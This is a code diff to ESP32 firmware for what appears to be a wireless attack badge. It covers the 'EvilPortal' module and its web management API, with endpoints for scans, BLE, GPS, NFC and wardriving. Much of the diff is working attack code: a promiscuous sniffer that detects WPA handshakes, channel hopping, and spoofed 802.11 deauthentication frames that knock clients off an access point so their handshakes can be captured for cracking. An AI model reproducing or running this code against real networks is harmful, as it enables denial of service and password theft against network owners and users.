@@ -1,11 +1,11 @@
 #include "EvilPortal.h"
 #include "WiFiScan.h"      // needed for ensureBLE() in management API handlers
+#include "esp_wifi.h"      // esp_wifi_stop() for the BLE heap-reclaim teardown
 #include "WardriverStore.h"
 #include "mbedtls/sha256.h"
 #include "CommandLine.h"
 #include "esp_mac.h"      // esp_efuse_mac_get_default for management identity
 #include "esp_netif.h"    // AP DHCP server status check in rearmManagementAP()
-#include "esp_wifi.h"     // esp_wifi_stop/deinit for BLE heap reclaim
 #include "NfcInterface.h" // NFC read/write for management API
 #include <Update.h>       // OTA firmware update via web upload
 #include <ArduinoJson.h>  // E: Bug E — proper JSON body parsing
@@ -639,6 +639,18 @@ void EvilPortal::main(uint8_t scan_mode) {
   if ((scan_mode == WIFI_SCAN_EVIL_PORTAL) && (this->has_ap) && (this->has_html)){
     this->dnsServer.processNextRequest();
     
+    // Channel hop during handshake capture
+    static uint32_t lastHsHop = 0;
+    static uint8_t hsCh = 1;
+    if (hs_active) {
+      uint32_t now = millis();
+      if (now - lastHsHop > 250) {  // hop every 250ms
+        lastHsHop = now;
+        hsCh = (hsCh % 13) + 1;
+        esp_wifi_set_channel(hsCh, WIFI_SECOND_CHAN_NONE);
+      }
+    }
+    
     server.handleClient();
     
     if (this->name_received && this->password_received) {
@@ -708,19 +720,6 @@ EvilPortal::hs_entry_t EvilPortal::hs_list[MAX_HS_ENTRIES];
 uint8_t EvilPortal::hs_count = 0;
 bool EvilPortal::hs_active = false;
 bool EvilPortal::hs_deauth = false;
-uint8_t EvilPortal::hs_target_bssid[6] = {0};
-uint8_t EvilPortal::hs_target_ch = 0;
-uint8_t EvilPortal::hs_hop_channels[14] = {0};
-uint8_t EvilPortal::hs_hop_count = 0;
-volatile uint32_t EvilPortal::hs_pkt_count = 0;
-volatile uint32_t EvilPortal::hs_eapol_count = 0;
-volatile uint32_t EvilPortal::hs_beacon_count = 0;
-volatile uint32_t EvilPortal::hs_data_count = 0;
-volatile uint32_t EvilPortal::hs_short_count = 0;
-uint8_t EvilPortal::hs_dbg_frames[4][48] = {{0}};
-uint8_t EvilPortal::hs_dbg_lens[4] = {0};
-volatile uint8_t EvilPortal::hs_dbg_count = 0;
-volatile bool EvilPortal::hs_dbg_eapol_found = false;
 
 int EvilPortal::hsFindOrAdd(const uint8_t* bssid) {
   for (int i = 0; i < hs_count; i++) {
@@ -740,120 +739,53 @@ void IRAM_ATTR EvilPortal::hsSnifferCallback(void* buf, wifi_promiscuous_pkt_typ
   wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
   uint8_t* payload = pkt->payload;
   int len = pkt->rx_ctrl.sig_len;
-
-  // Scan ALL packets for 0x888e regardless of length filter
-  int scan_len = len < 64 ? len : 64;
-  for (int i = 0; i < scan_len - 1; i++) {
-    if (payload[i] == 0x88 && payload[i+1] == 0x8e) {
-      hs_dbg_eapol_found = true;
-      // Store this frame in slot 3 (reserved for eapol-bearing frames)
-      int cp = len < 48 ? len : 48;
-      memcpy(hs_dbg_frames[3], payload, cp);
-      hs_dbg_lens[3] = cp;
-      break;
-    }
-  }
-
-  if (len < 36) { hs_short_count++; return; }
-
-  hs_pkt_count++;
+  if (len < 36) return;
 
   uint8_t frame_type = payload[0];
 
-  // Beacon frame (0x80) — extract SSID for display, rate-limited
-  // On single-core C5, processing every beacon starves the main loop.
-  // Skip if BSSID already known; only deauth once per BSSID per 5s.
+  // Beacon frame (0x80) — extract SSID for display
   if (frame_type == 0x80 && len > 38) {
-    hs_beacon_count++;
     const uint8_t* bssid = &payload[10];
     int idx = hsFindOrAdd(bssid);
-    if (idx >= 0) {
-      // Update SSID only if empty (first time)
-      if (hs_list[idx].ssid[0] == '\0') {
-        if (payload[36] == 0x00 && payload[37] > 0 && payload[37] < 33) {
-          int ssid_len = payload[37];
-          memcpy(hs_list[idx].ssid, &payload[38], ssid_len);
-          hs_list[idx].ssid[ssid_len] = '\0';
-        }
-        hs_list[idx].rssi = pkt->rx_ctrl.rssi;
-        // Use the channel we SET, not rx_ctrl (which always reports AP ch in APSTA)
-        uint8_t cur_ch;
-        wifi_second_chan_t sec;
-        esp_wifi_get_channel(&cur_ch, &sec);
-        hs_list[idx].ch = cur_ch;
+    if (idx >= 0 && hs_list[idx].ssid[0] == '\0') {
+      // SSID is in tagged params starting at byte 36
+      if (payload[36] == 0x00 && payload[37] > 0 && payload[37] < 33) {
+        int ssid_len = payload[37];
+        memcpy(hs_list[idx].ssid, &payload[38], ssid_len);
+        hs_list[idx].ssid[ssid_len] = '\0';
       }
+      hs_list[idx].rssi = pkt->rx_ctrl.rssi;
+      hs_list[idx].ch = pkt->rx_ctrl.channel;
+    }
 
-      // Deauth: 1s rate limit, 3 frames per burst
-      if (hs_deauth && (millis() - hs_list[idx].last_deauth_ms > 1000)) {
-        hs_list[idx].last_deauth_ms = millis();
-        extern WiFiScan wifi_scan_obj;
-      // Deauth frame template
+    // Send deauth if enabled
+    if (hs_deauth) {
+      extern WiFiScan wifi_scan_obj;
       uint8_t deauth[26] = {
         0xC0, 0x00, 0x3A, 0x01,
-        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // dst: broadcast
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // src: AP BSSID
-        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // bssid: AP
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // broadcast
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // src = AP
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // bssid = AP
         0x00, 0x00,                           // seq
         0x07, 0x00                            // reason: class 3
       };
       memcpy(&deauth[10], bssid, 6);
       memcpy(&deauth[16], bssid, 6);
-      // Burst: 3x broadcast deauth (as if from AP to all clients)
-      for (int i = 0; i < 3; i++) {
-        esp_wifi_80211_tx(WIFI_IF_STA, deauth, 26, false);
-      }
-      // Also send deauth TO the AP (as if from a client, src=broadcast)
-      // This makes the AP think its client disconnected
-      memcpy(&deauth[4], bssid, 6);   // dst = AP
-      deauth[10] = 0xFF; deauth[11] = 0xFF; deauth[12] = 0xFF;
-      deauth[13] = 0xFF; deauth[14] = 0xFF; deauth[15] = 0xFF; // src = broadcast
-      for (int i = 0; i < 3; i++) {
-        esp_wifi_80211_tx(WIFI_IF_STA, deauth, 26, false);
-      }
-      }
+      esp_wifi_80211_tx(WIFI_IF_STA, deauth, 26, false);
     }
     return;
   }
 
-  hs_data_count++;
-
-  // Store first 3 data frames for debug inspection
-  if (hs_dbg_count < 3) {
-    int slot = hs_dbg_count;
-    int cp = len < 48 ? len : 48;
-    memcpy(hs_dbg_frames[slot], payload, cp);
-    hs_dbg_lens[slot] = cp;
-    hs_dbg_count++;
-  }
-
-  // EAPOL frame detection: check for 0x888e at multiple offsets
-  // C5 QoS data has HT Control field: LLC starts at offset 34, EtherType at 40
+  // EAPOL frame detection: check for 0x888e at offset 30 or 32
   bool is_eapol = false;
   int eapol_off = 0;
-  // C5 QoS+HT Control: LLC at 34, EtherType at 40
-  if (len > 42 && payload[40] == 0x88 && payload[41] == 0x8e) {
-    is_eapol = true; eapol_off = 42;
-  // Standard non-QoS data: LLC at 24, EtherType at 30
-  } else if (len > 34 && payload[30] == 0x88 && payload[31] == 0x8e) {
+  if (len > 34 && payload[30] == 0x88 && payload[31] == 0x8e) {
     is_eapol = true; eapol_off = 32;
-  // QoS data (no HT): LLC at 26, EtherType at 32
   } else if (len > 36 && payload[32] == 0x88 && payload[33] == 0x8e) {
     is_eapol = true; eapol_off = 34;
-  // 4-addr QoS (WDS/mesh): LLC at 32, EtherType at 38
-  } else if (len > 40 && payload[38] == 0x88 && payload[39] == 0x8e) {
-    is_eapol = true; eapol_off = 40;
-  // Brute scan: search all plausible offsets 28-48
-  } else {
-    for (int off = 28; off <= 48 && off + 1 < len; off += 2) {
-      if (payload[off] == 0x88 && payload[off+1] == 0x8e) {
-        is_eapol = true; eapol_off = off + 2;
-        break;
-      }
-    }
   }
 
   if (is_eapol) {
-    hs_eapol_count++;
     // BSSID is at offset 10 (addr1=dst) or 16 (addr3=bssid)
     const uint8_t* bssid = &payload[16];
     int idx = hsFindOrAdd(bssid);
@@ -1062,12 +994,6 @@ void EvilPortal::setupManagementServer() {
     SPIFFS.rename("/portal_mgmt.html", "/portal.html");
     Serial.println("[MGMT] Management portal restored from backup");
   }
-  // Restore gzipped management dashboard if stashed by evil twin
-  if (SPIFFS.exists("/portal_mgmt.html.gz")) {
-    SPIFFS.remove("/portal.html.gz");
-    SPIFFS.rename("/portal_mgmt.html.gz", "/portal.html.gz");
-    Serial.println("[MGMT] Management portal.gz restored from backup");
-  }
 
   // Load persisted SSIDs from SPIFFS
   mgmtLoadSSIDs(ssids, wifi_scan_obj);
@@ -1249,11 +1175,17 @@ void EvilPortal::setupManagementServer() {
       return;
     }
 
-    Serial.println("[MGMT] web scan: WiFi.scanNetworks (all channels)");
+    int scanDur = (int)mgmtBodyLong("duration", 10);
+    if (scanDur < 10)  scanDur = 10;
+    if (scanDur > 120) scanDur = 120;
+
+    Serial.printf("[MGMT] web scan: budget %ds, all channels\n", scanDur);
     this->mgmt_job_state = MGMT_JOB_SCANNING;
     this->mgmt_job_kind  = "scan-ap-direct";
     this->mgmt_job_t0    = millis();
-    this->mgmt_job_duration_s = 0; // unlimited — mgmtServiceJob polls scanComplete
+    this->mgmt_job_duration_s = (uint32_t)scanDur;
+    this->mgmt_scan_retried = false; // allow one auto-retry if the radio returns 0/-2
+    this->mgmt_scan_seen_n  = 0;     // reset the cross-cycle dedup table
 
     // C: Bug C — delete stations/beacon before clearing to prevent ~1.5KB/scan leak
     while (access_points->size() > 0) {
@@ -1295,11 +1227,12 @@ void EvilPortal::setupManagementServer() {
       }
       snprintf(buf, sizeof(buf),
                "%s{\"i\":%d,\"ssid\":\"%s\",\"ch\":%d,\"rssi\":%d,\"sel\":%s,"
-               "\"auth\":\"%s\",\"open\":%s,"
+               "\"auth\":\"%s\",\"open\":%s,\"wpsPresent\":%s,"
                "\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\"}",
                i ? "," : "", i, ess.c_str(), ap.channel, (int)ap.rssi,
                ap.selected ? "true" : "false",
                auth_str, is_open ? "true" : "false",
+               ap.wpsPresent ? "true" : "false",
                ap.bssid[0], ap.bssid[1], ap.bssid[2],
                ap.bssid[3], ap.bssid[4], ap.bssid[5]);
       server.sendContent(buf);
@@ -1434,12 +1367,11 @@ void EvilPortal::setupManagementServer() {
     }
     String action = server.hasArg("action") ? server.arg("action") : "";
     long duration = server.hasArg("duration") ? server.arg("duration").toInt() : -1;
-    String bk_arg = server.hasArg("kind") ? server.arg("kind") : (server.hasArg("type") ? server.arg("type") : "");
+    String bk_arg = server.hasArg("kind") ? server.arg("kind") : "";
     if (action == "" || duration < 0 || bk_arg == "") {
       if (action == "")  action = mgmtBodyStr("action");
       if (duration < 0)  duration = mgmtBodyLong("duration", (long)(action == "scan" ? 15 : 30));
       if (bk_arg == "")  bk_arg = mgmtBodyStr("kind");
-      if (bk_arg == "")  bk_arg = mgmtBodyStr("type");
     }
     if (duration != 0 && (duration < 10 || duration > 600)) {
       server.send(400, "application/json; charset=utf-8",
@@ -1467,40 +1399,39 @@ void EvilPortal::setupManagementServer() {
       return;
     }
 
-    // BLE needs ~40KB contiguous. Post-web-serving, heap is fragmented.
-    // Strategy: send HTTP response first, then tear down WiFi, init BLE, run.
-    // The job timer in mgmtServiceJob will restore the AP when BLE finishes.
+    // NimBLE needs a large CONTIGUOUS block that the live WiFi driver + AP
+    // sockets + SPIFFS cache keep fragmented, so ensureBLE() fails with the
+    // AP up no matter how much total heap is free. Tear the radio stack down
+    // first, then init BLE. The job timer in mgmtServiceJob reboots the badge
+    // when the duration expires, which is the only reliable way to get the
+    // management AP back (NimBLE does not return its heap on deinit).
     bool needTeardown = !wifi_scan_obj.ble_initialized;
 
-    // Send response while AP is still up
+    // Answer while the AP is still up — the client must receive this before
+    // the radio goes down, otherwise the UI just sees a dead socket.
     server.send(200, "application/json; charset=utf-8",
       "{\"ok\":true,\"state\":\"attack\",\"kind\":\"" + mgmtJsonEscape(kind) +
       "\",\"duration\":" + String(duration) +
       (duration > 0
-        ? ",\"note\":\"WiFi se apaga durante BLE. Al terminar los " + String(duration) + "s el badge se reinicia solo y vuelve el panel.\""
-        : ",\"note\":\"WiFi se apaga durante BLE (modo indefinido). Presiona RESET para terminar y reiniciar a modo normal.\"") + "}");
+        ? ",\"note\":\"WiFi se apaga durante BLE. Al terminar los " + String(duration) + "s el badge se reinicia solo y vuelve el panel.\"}"
+        : ",\"note\":\"WiFi se apaga durante BLE (modo indefinido). Presiona RESET para volver al panel.\"}"));
 
-    // Now tear down WiFi if BLE not initialized
     if (needTeardown) {
       Serial.println("[BLE] Tearing down WiFi for BLE init...");
-      delay(500); // let HTTP response flush completely
+      delay(500); // let the HTTP response flush completely
 
-      // Aggressive cleanup to defragment heap for BLE's contiguous need
+      // Release every large allocation that fragments the heap
       this->dnsServer.stop();
       server.stop();
-      server.close();              // release all socket buffers
+      server.close();   // release socket buffers
+      SPIFFS.end();     // release the SPIFFS cache
 
-      // Unmount SPIFFS to release its cache
-      SPIFFS.end();
-
-      // Full WiFi shutdown (keep driver initialized for recovery)
       WiFi.softAPdisconnect(true);
       WiFi.disconnect(true, true);
       WiFi.mode(WIFI_MODE_NULL);
       delay(100);
-      esp_wifi_stop();             // stop radio but keep driver alive
+      esp_wifi_stop();  // stop the radio, keep the driver alive for recovery
       this->management_active = false;
-
       delay(500);
 
       Serial.printf("[BLE] Post-teardown largest block: %u bytes, free: %u\n",
@@ -1511,11 +1442,15 @@ void EvilPortal::setupManagementServer() {
     if (!wifi_scan_obj.ensureBLE()) {
       Serial.printf("[BLE] Init failed, largest=%u\n",
                     (unsigned)heap_caps_get_largest_free_block(MALLOC_CAP_8BIT));
-      // Restore SPIFFS + AP
+      // Bring the panel back so the operator is not locked out
       SPIFFS.begin(true);
       this->rearmManagementAP();
       this->management_active = true;
       server.begin();
+      // Restart DNS too: without it iOS/macOS flag the network as broken and
+      // auto-disconnect (reason=8 ASSOC_LEAVE), so the panel looks dead even
+      // though the AP is back.
+      this->dnsServer.start(53, "*", WiFi.softAPIP());
       return;
     }
 
@@ -1535,10 +1470,6 @@ void EvilPortal::setupManagementServer() {
         this->mgmt_job_state == MGMT_JOB_ATTACK) {
       Serial.println("[MGMT] web stop requested");
       cli_obj.runCommand("stopscan");
-      {
-        extern WardriverStore wardrive_store;
-        wardrive_store.active = false;
-      }
       this->mgmt_job_state = MGMT_JOB_REARM;
       this->mgmt_job_t0    = millis();
       server.send(200, "application/json; charset=utf-8", "{\"ok\":true,\"state\":\"rearm\"}");
@@ -1575,30 +1506,44 @@ void EvilPortal::setupManagementServer() {
     #endif
   });
 
-  // ── API: POST /api/gps {action: "restart"} ───────────────────
+  // ── API: POST /api/gps — full module re-init ─────────────────
+  // GpsInterface::begin() powers GPS_ON_PIN back HIGH, re-probes 9600/115200
+  // and re-sets gps_enabled. This is the ONLY recovery path when the boot
+  // probe failed: begin() drives the pin LOW and latches gps_enabled=false,
+  // so a cold/slow module stays dead until reboot without this route.
+  // Deliberately does NOT early-return on !getGpsModuleStatus() — recovering
+  // from exactly that state is the point. Blocks ~7.5s worst case (same
+  // code path the boot already takes when the module is absent).
   server.on("/api/gps", HTTP_POST, [this]() {
     #ifdef HAS_GPS
-      if (!gps_obj.getGpsModuleStatus()) {
-        server.send(200, "application/json; charset=utf-8",
-          "{\"ok\":false,\"code\":\"no_module\"}");
+      // SAFETY: begin() re-inits the UART, calls disable_queue() and blocks
+      // ~7.5s. Doing that under an active wardrive/attack kills the NMEA
+      // stream mid-job (and leaves GPS powered OFF if the probe window
+      // misses), so the job silently stops producing points. Only allow a
+      // re-init when nothing is running.
+      if (this->mgmt_job_state != MGMT_JOB_IDLE) {
+        server.send(409, "application/json; charset=utf-8",
+          "{\"ok\":false,\"code\":\"busy\",\"state\":\"" + this->mgmtJobStateName() +
+          "\",\"output\":\"Detén el trabajo en curso antes de reiniciar el GPS\"}");
         return;
       }
-      // Force GPS module restart (hot start + re-apply multi-constellation)
-      gps_obj.sendPMTKCommand("PMTK104"); // Full cold restart
-      delay(500);
-      gps_obj.sendPMTKCommand("PMTK314,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0");
-      delay(100);
-      gps_obj.sendPMTKCommand("PMTK353,1,1,1,1,1,0,0,0,0"); // Multi-constellation
-      delay(100);
-      gps_obj.sendPMTKCommand("PMTK301,2"); // Enable SBAS/DGPS
-      delay(100);
-      gps_obj.sendPMTKCommand("PMTK313,1"); // Enable SBAS search
-      Serial.println("[GPS] Forced restart with SBAS");
-      server.send(200, "application/json; charset=utf-8",
-        "{\"ok\":true,\"output\":\"GPS restarted (cold + SBAS)\"}");
+      Serial.println("[MGMT] GPS re-init requested");
+      gps_obj.begin();
+      bool det = gps_obj.getGpsModuleStatus();
+      String json = "{\"ok\":";
+      json += det ? "true" : "false";
+      json += ",\"detected\":";
+      json += det ? "true" : "false";
+      if (!det) json += ",\"code\":\"no_module\"";
+      json += ",\"sats\":" + String(gps_obj.getNumSats());
+      json += ",\"fix\":" + String(gps_obj.getFixStatus() ? "true" : "false");
+      json += ",\"output\":\"";
+      json += det ? "GPS re-inicializado" : "GPS no detectado tras reintento";
+      json += "\"}";
+      server.send(200, "application/json; charset=utf-8", json);
     #else
       server.send(200, "application/json; charset=utf-8",
-        "{\"ok\":false,\"code\":\"no_gps\"}");
+        "{\"ok\":false,\"code\":\"no_gps\",\"output\":\"GPS not supported on this build\"}");
     #endif
   });
 
@@ -1626,15 +1571,14 @@ void EvilPortal::setupManagementServer() {
       uint8_t ndef[32];
       memcpy(ndef, block1, 16);
       memcpy(ndef + 16, block2, 16);
-      // Check for NDEF TLV: 03 LEN D1 01 PL_LEN TYPE ...
-      //                       0   1   2  3    4    5
+      // Check for NDEF TLV: 03 LEN D1 01 ...
       if (ndef[0] == 0x03 && ndef[2] == 0xD1) {
-        uint8_t rec_type = ndef[5]; // Type code (0x55=URI, 0x54=Text)
-        if (rec_type == 0x55) { // URI
+        uint8_t tnf = ndef[4]; // TNF + type length
+        if (tnf == 0x55) { // URI
           ctype = "uri";
           // URI prefix codes
           const char* pfx[] = {"","http://www.","https://www.","http://","https://",
-                               "tel:","mailto:","ftp://anonymous:***@ftp.",
+                               "tel:","mailto:","ftp://anonymous:anonymous@ftp.",
                                "ftp://ftp.","ftps://","sftp://","smb://","nfs://",
                                "ftp://","dav://","news:","telnet://","imap:",
                                "rtsp://","urn:","pop:","sip:","sips:","tftp:","btspp://",
@@ -1644,7 +1588,7 @@ void EvilPortal::setupManagementServer() {
           int pidx = ndef[6];
           String prefix = (pidx < 36) ? pfx[pidx] : "";
           // Extract text after prefix byte
-          int len = ndef[4] - 1; // payload length minus prefix byte
+          int len = ndef[1] - 5; // payload length
           if (len > 25) len = 25;
           content = prefix;
           for (int i = 0; i < len; i++) {
@@ -1652,10 +1596,10 @@ void EvilPortal::setupManagementServer() {
             if (c == 0xFE || c == 0) break;
             content += c;
           }
-        } else if (rec_type == 0x54) { // Text
+        } else if (tnf == 0x54) { // Text
           ctype = "text";
           int lang_len = ndef[6] & 0x3F;
-          int len = ndef[4] - 1 - lang_len;
+          int len = ndef[1] - 5 - lang_len;
           if (len > 25) len = 25;
           for (int i = 0; i < len; i++) {
             char c = (char)ndef[7 + lang_len + i];
@@ -1783,49 +1727,6 @@ void EvilPortal::setupManagementServer() {
           "{\"ok\":false,\"code\":\"invalid_key\",\"output\":\"key must be alphanumeric/underscore\"}");
         return;
       }
-    }
-    // Check if this is a numeric value setting (slider/range)
-    String valStr = mgmtBodyStr("value");
-    if (valStr.length() > 0) {
-      // Numeric setting
-      int numVal = valStr.toInt();
-      DynamicJsonDocument json(1024);
-      if (deserializeJson(json, settings_obj.getSettingsString())) {
-        server.send(500, "application/json; charset=utf-8", "{\"ok\":false,\"code\":\"parse_error\"}");
-        return;
-      }
-      bool found = false;
-      for (int i = 0; i < (int)json["Settings"].size(); i++) {
-        if (json["Settings"][i]["name"].as<String>() == key) {
-          // Check range
-          int minV = json["Settings"][i]["range"]["min"] | 0;
-          int maxV = json["Settings"][i]["range"]["max"] | 255;
-          if (numVal < minV) numVal = minV;
-          if (numVal > maxV) numVal = maxV;
-          json["Settings"][i]["value"] = numVal;
-          File settingsFile = SPIFFS.open("/settings.json", FILE_WRITE);
-          if (!settingsFile) {
-            server.send(500, "application/json; charset=utf-8", "{\"ok\":false,\"code\":\"fs_error\"}");
-            return;
-          }
-          String out;
-          serializeJson(json, settingsFile);
-          serializeJson(json, out);
-          settingsFile.close();
-          settings_obj.setSettingsString(out);
-          settings_obj.printJsonSettings(out);
-          found = true;
-          break;
-        }
-      }
-      if (!found) {
-        server.send(400, "application/json; charset=utf-8",
-          "{\"ok\":false,\"code\":\"unknown_setting\",\"output\":\"setting not found\"}");
-        return;
-      }
-      server.send(200, "application/json; charset=utf-8",
-        "{\"ok\":true,\"key\":\"" + mgmtJsonEscape(key) + "\",\"value\":" + String(numVal) + "}");
-      return;
     }
     bool val = (on == "1" || on == "true" || on == "enable");
     bool result = settings_obj.saveSetting<bool>(key, val);
@@ -1995,7 +1896,7 @@ void EvilPortal::setupManagementServer() {
   });
 
   // ── API: POST /api/handshake — passive capture (AP stays up) ──
-  // {deauth:bool, duration:10-300, bssid:"AA:BB:CC:DD:EE:FF", ch:6}
+  // {deauth:bool, duration:10-300}
   server.on("/api/handshake", HTTP_POST, [this]() {
     if (this->mgmt_job_state != MGMT_JOB_IDLE) {
       server.send(409, "application/json; charset=utf-8", "{\"ok\":false,\"code\":\"busy\"}");
@@ -2011,116 +1912,29 @@ void EvilPortal::setupManagementServer() {
     hs_count = 0;
     hs_active = true;
     hs_deauth = do_deauth;
-    hs_pkt_count = 0;
-    hs_eapol_count = 0;
-    hs_beacon_count = 0;
-    hs_data_count = 0;
-    hs_short_count = 0;
-    hs_dbg_count = 0;
-    hs_dbg_eapol_found = false;
-    memset(hs_dbg_frames, 0, sizeof(hs_dbg_frames));
-    memset(hs_dbg_lens, 0, sizeof(hs_dbg_lens));
     memset(hs_list, 0, sizeof(hs_list));
-    memset(hs_target_bssid, 0, 6);
-    hs_target_ch = 0;
-    hs_hop_count = 0;
-    memset(hs_hop_channels, 0, sizeof(hs_hop_channels));
-
-    // Parse optional target BSSID
-    String bssid_str = mgmtBodyStr("bssid");
-    uint8_t target_ch = (uint8_t)mgmtBodyLong("ch", 0);
-    bool targeted = false;
-
-    if (bssid_str.length() == 17) {
-      unsigned int b[6];
-      if (sscanf(bssid_str.c_str(), "%x:%x:%x:%x:%x:%x",
-                 &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) == 6) {
-        for (int i = 0; i < 6; i++) hs_target_bssid[i] = b[i];
-        hs_target_ch = target_ch;
-        targeted = true;
-      }
-    }
-
-    // Build channel hop list from scanned APs (if not targeted)
-    if (!targeted && access_points && access_points->size() > 0) {
-      bool seen[178] = {false}; // channels 1-177
-      for (int i = 0; i < access_points->size() && i < 100; i++) {
-        uint8_t ch = access_points->get(i).channel;
-        if (ch > 0 && ch < 178 && !seen[ch]) {
-          seen[ch] = true;
-          if (hs_hop_count < 14) {
-            hs_hop_channels[hs_hop_count++] = ch;
-          }
-        }
-      }
-      Serial.printf("[MGMT] Handshake hop list: %u channels [", (unsigned)hs_hop_count);
-      for (int i = 0; i < hs_hop_count; i++) Serial.printf("%u ", hs_hop_channels[i]);
-      Serial.println("]");
-    }
-    // Fallback: hop 1-13 if no scan data
-    if (!targeted && hs_hop_count == 0) {
-      for (int i = 1; i <= 13; i++) hs_hop_channels[hs_hop_count++] = i;
-    }
-
-    // Pre-populate hs_list with AP data from scan (so we have SSIDs/BSSIDs
-    // even with DATA-only promiscuous filter — no beacons needed)
-    if (access_points && access_points->size() > 0) {
-      for (int i = 0; i < access_points->size() && hs_count < MAX_HS_ENTRIES; i++) {
-        AccessPoint ap = access_points->get(i);
-        memcpy(hs_list[hs_count].bssid, ap.bssid, 6);
-        strncpy(hs_list[hs_count].ssid, ap.essid.c_str(), 32);
-        hs_list[hs_count].ssid[32] = '\0';
-        hs_list[hs_count].ch = ap.channel;
-        hs_list[hs_count].rssi = (int8_t)ap.rssi;
-        hs_list[hs_count].eapol_msgs = 0;
-        hs_list[hs_count].has_pmkid = false;
-        hs_list[hs_count].last_deauth_ms = 0;
-        hs_count++;
-      }
-      Serial.printf("[MGMT] Pre-populated %u APs from scan\n", (unsigned)hs_count);
-    }
-
-    // If no channels from scan, use common 2.4GHz + 5GHz channels
-    if (hs_hop_count == 0) {
-      const uint8_t defaults[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44};
-      hs_hop_count = sizeof(defaults);
-      memcpy(hs_hop_channels, defaults, sizeof(defaults));
-      Serial.printf("[MGMT] No scan data, using %u default channels\n", (unsigned)hs_hop_count);
-    }
 
     // Enable promiscuous mode while keeping AP running (AP_STA)
     WiFi.mode(WIFI_AP_STA);
     delay(100);
 
-    // Capture BOTH mgmt and data frames. EAPOL is data, but we also need
-    // mgmt for PMKID in some implementations. Beacon flood is mitigated by
-    // rate-limiting in the callback (skip known BSSIDs, deauth from hop loop).
     wifi_promiscuous_filter_t filt;
     filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
     esp_wifi_set_promiscuous_filter(&filt);
     esp_wifi_set_promiscuous_rx_cb(&EvilPortal::hsSnifferCallback);
     esp_wifi_set_promiscuous(true);
 
-    // If targeted, jump to target channel immediately
-    if (targeted && hs_target_ch > 0) {
-      esp_wifi_set_channel(hs_target_ch, WIFI_SECOND_CHAN_NONE);
-      Serial.printf("[MGMT] Targeted ch=%u bssid=%s\n", hs_target_ch, bssid_str.c_str());
-    }
-
-    Serial.println("[MGMT] Handshake capture started, deauth=" +
-                   String(do_deauth) + " dur=" + String(dur) + "s" +
-                   (targeted ? " TARGET=" + bssid_str + " ch=" + String(target_ch) : " PASSIVE"));
+    Serial.println("[MGMT] Passive handshake capture started, deauth=" +
+                   String(do_deauth) + " dur=" + String(dur) + "s");
 
     this->mgmt_job_state = MGMT_JOB_ATTACK;
     this->mgmt_job_kind  = "handshake-passive";
     this->mgmt_job_t0    = millis();
     this->mgmt_job_duration_s = (uint32_t)dur;
 
-    String mode = targeted ? "targeted" : "passive";
     server.send(200, "application/json; charset=utf-8",
-      "{\"ok\":true,\"mode\":\"" + mode + "\",\"deauth\":" + String(do_deauth ? "true" : "false") +
-      ",\"duration\":" + String(dur) +
-      (targeted ? ",\"target_ch\":" + String(target_ch) : ",\"channels\":" + String(hs_hop_count)) + "}");
+      "{\"ok\":true,\"mode\":\"passive\",\"channels\":13,\"deauth\":" + String(do_deauth ? "true" : "false") +
+      ",\"duration\":" + String(dur) + "}");
   });
 
   // ── API: GET /api/handshake — read captured handshakes ────────
@@ -2149,12 +1963,7 @@ void EvilPortal::setupManagementServer() {
       json += ",\"pmkid\":" + String(hs_list[i].has_pmkid ? "true" : "false");
       json += ",\"type\":\"" + hs_type + "\"}";
     }
-    json += "],\"pkt_count\":" + String(hs_pkt_count) +
-            ",\"eapol_count\":" + String(hs_eapol_count) +
-            ",\"beacon_count\":" + String(hs_beacon_count) +
-            ",\"data_count\":" + String(hs_data_count) +
-            ",\"short_count\":" + String(hs_short_count) +
-            ",\"eapol_found\":" + String(hs_dbg_eapol_found ? "true" : "false") + "}";
+    json += "]}";
     server.send(200, "application/json; charset=utf-8", json);
   });
 
@@ -2167,6 +1976,22 @@ void EvilPortal::setupManagementServer() {
     String type = mgmtBodyStr("type");
     if (type == "") type = "wifi";
     String cmd = (type == "bt") ? "btwardrive" : "wardrive";
+    // F-10 fix: both wardrive commands are gated behind getGpsModuleStatus() inside
+    // CommandLine, and runCommand() returns void. Without this pre-check the handler
+    // reported {"ok":true} and set MGMT_JOB_SCANNING while no scan ever started, so the
+    // UI showed "activo", got active:false from /api/wardrive/data and killed its poller.
+#ifdef HAS_GPS
+    if (!gps_obj.getGpsModuleStatus()) {
+      server.send(503, "application/json; charset=utf-8",
+        "{\"ok\":false,\"code\":\"gps_down\",\"output\":\"GPS no detectado. Abre la pestana GPS, "
+        "pulsa Reiniciar GPS y espera el fix antes de iniciar el wardrive.\"}");
+      return;
+    }
+#else
+    server.send(503, "application/json; charset=utf-8",
+      "{\"ok\":false,\"code\":\"no_gps_support\",\"output\":\"Esta compilacion no incluye GPS.\"}");
+    return;
+#endif
     // A: Bug A — guard BLE for bt wardrive
     if (type == "bt" && !wifi_scan_obj.ensureBLE()) {
       size_t freeLargest = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);
@@ -2178,9 +2003,16 @@ void EvilPortal::setupManagementServer() {
     Serial.println("[MGMT] web wardrive: " + cmd);
     SerialMirror::logDrain();
     cli_obj.runCommand(cmd);
+    // F-10 fix: runCommand() is void, so confirm the scan really started before
+    // reporting success. CommandLine sets this flag only on its success path.
     {
       extern WardriverStore wardrive_store;
-      wardrive_store.active = true;
+      if (!wardrive_store.active) {
+        server.send(503, "application/json; charset=utf-8",
+          "{\"ok\":false,\"code\":\"wardrive_refused\",\"output\":\"El firmware no pudo iniciar el "
+          "wardrive. Revisa el estado del GPS y vuelve a intentar.\"}");
+        return;
+      }
     }
     this->mgmt_job_state = MGMT_JOB_SCANNING;
     this->mgmt_job_kind  = "wardrive-" + type;
@@ -2204,11 +2036,11 @@ void EvilPortal::setupManagementServer() {
       String buf = "";
       if (!first) buf += ",";
       first = false;
